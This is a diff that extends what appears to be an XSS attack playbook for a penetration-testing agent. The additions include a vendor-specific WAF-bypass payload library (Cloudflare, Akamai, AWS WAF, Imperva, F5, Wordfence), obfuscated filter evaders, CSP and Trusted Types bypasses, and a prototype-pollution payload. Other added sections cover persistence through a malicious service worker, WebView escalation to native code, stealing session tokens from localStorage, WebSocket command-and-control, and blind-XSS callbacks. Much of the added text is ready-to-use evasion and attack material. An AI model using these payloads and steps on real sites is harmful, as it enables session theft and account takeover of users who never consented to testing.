@@ -107,15 +107,62 @@ Handlebars helpers, lodash templates):
 - Weak policy: missing nonces/hashes, wildcards, `data:` / `blob:` allowed,
   inline events allowed.
 - Script gadgets: JSONP endpoints, libraries exposing function constructors.
+  Concrete: if `accounts.google.com` is allow-listed, abuse
+  `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`.
 - Import maps or `modulepreload` lax policies.
 - Base-tag injection to retarget relative script URLs.
 - Dynamic module import with allowed origins.
+- CSP injection: when the policy itself is built from user input, append
+  your own source to `script-src`.
+- Defeat the modern strict pattern (`'nonce-…' 'strict-dynamic'`) by
+  finding a parser-injection point that lets you write a `<script>` tag
+  that inherits a leaked nonce, or by abusing a same-origin script gadget.
 
 ### Trusted Types bypass
 - Custom policies returning unsanitized strings — abuse the policy
   whitelist.
 - Sinks not covered by Trusted Types (CSS, URL handlers) — pivot via
   gadgets.
+- Policies that call `policy.createHTML(location.hash)` still funnel
+  untrusted input straight to a `TrustedHTML` — exploit the source.
+- Legacy code paths bypassing Trusted Types via `setAttribute('onclick',
+  …)` or dynamic event handler assignment.
+
+### Prototype-pollution → XSS
+Libraries that deep-merge JSON into the DOM let you poison shared
+prototypes and turn future DOM writes into script execution:
+```
+{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
+```
+Test wherever `Object.assign`, lodash `merge`, or hand-rolled deep-merge
+utilities consume user JSON.
+
+### WAF bypass payload library
+Concrete payloads observed against major WAFs (rotate when one is
+filtered):
+```html
+<!-- Cloudflare -->
+<svg><animateTransform onbegin=alert`1`>
+<!-- Akamai (Unicode-escaped identifier) -->
+<img src=x onerror="alert(1)">
+<!-- AWS WAF (URL-encoded inside data: iframe) -->
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
+<!-- Imperva (HTML-entity encoded body) -->
+<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">
+<!-- F5 BIG-IP -->
+<svg/onload=alert(1)//
+<marquee onstart=alert(1)>
+<!-- Wordfence (base-tag retarget) -->
+<base href="javascript:/a/-alert(1)//">
+```
+Generic tag/string filter evaders:
+```
+<scrscriptipt>alert(1)</scrscriptipt>      # nested-tag stripping
+eval(atob('YWxlcnQoMSk='))                  # base64 string filter bypass
+top['al'+'ert'](1)                          # split identifier
+<a href="j&Tab;a&Tab;v&Tab;asc&Tab;r&Tab;ipt:alert(1)">x</a>
+```
+Parentheses-stripping bypass: ``alert`1` `` (tagged template).
 
 ## Polyglot payloads (one per context)
 
@@ -148,6 +195,20 @@ Handlebars helpers, lodash templates):
   `image/svg+xml` can execute inline. Verify content-type and
   `Content-Disposition: attachment`. Test mixed MIME and sniffing
   bypasses; check that `X-Content-Type-Options: nosniff` is set.
+- **Progressive Web App (PWA)** — register a malicious service worker
+  (`navigator.serviceWorker.register('/evil-sw.js')`) for persistence
+  across navigations; abuse `start_url` or `name` in `manifest.json`
+  (`javascript:` URLs, raw HTML); inject HTML into push notification
+  bodies if the renderer skips sanitization.
+- **Mobile WebView** — Android `addJavascriptInterface` exposes Java
+  methods to JS, so XSS becomes native code execution
+  (`<script>Android.exec('id')</script>`); `loadDataWithBaseURL` with a
+  `file://` base unlocks universal XSS. iOS WKWebView interpolating user
+  input into `evaluateJavaScript` strings yields injection; custom URL
+  schemes (`myapp://profile?name=<script>…`) are rarely sanitized.
+- **Speculation Rules API** (Chrome 121+) — `<script
+  type="speculationrules">` prefetches can fire request-time XSS sinks
+  before the user navigates; test prefetch URLs as their own surface.
 
 ## Workflow
 
@@ -169,6 +230,10 @@ Handlebars helpers, lodash templates):
 A finding is real only when:
 1. The minimal payload executes in the actual context (not just appears
    in the response — verify with DOM evidence or a fired callback).
+   Note: Chrome / Firefox / Safari suppress `alert` / `confirm` / `prompt`
+   dialogs in cross-origin iframes and background tabs — prefer
+   `console.log`, a `fetch` beacon, or an observable DOM mutation as
+   proof of execution.
 2. Cross-browser execution holds where relevant — or you can explain the
    parser-specific behavior.
 3. Stated defenses (sanitizer settings, CSP, Trusted Types) are bypassed
@@ -187,7 +252,9 @@ A finding is real only when:
 
 ## Post-exploitation
 - Session / token exfiltration — prefer fetch/XHR over image beacons for
-  reliability.
+  reliability. `SameSite=Lax` is the modern default, so cross-site cookie
+  theft is often blocked; pivot to tokens in `localStorage` /
+  `sessionStorage` or to same-origin CSRFable actions.
 - Real-time control — WebSocket C2 with a strict command set.
 - Persistence — service-worker registration; localStorage / script-gadget
   re-injection.
@@ -197,6 +264,13 @@ A finding is real only when:
 ## Tools to use
 - `curl` for injecting payloads and inspecting responses.
 - `dalfox` for automated XSS scanning when available.
+- `XSStrike` for context-aware reflected XSS detection.
+- `gau` / `waybackurls` + `gf xss` to mine historical parameters, then
+  pipe into `Gxss` / `Bxss` / `dalfox`.
+- `Arjun` for hidden parameter discovery.
+- Blind-XSS callbacks: `XSS Hunter`, `xss.report`, `Hookbin`,
+  Canarytokens — register a payload, then submit it into every field you
+  cannot see rendered (admin notes, support tickets, log viewers).
 - View the page source and rendered DOM to trace how input is reflected
   or stored.
 
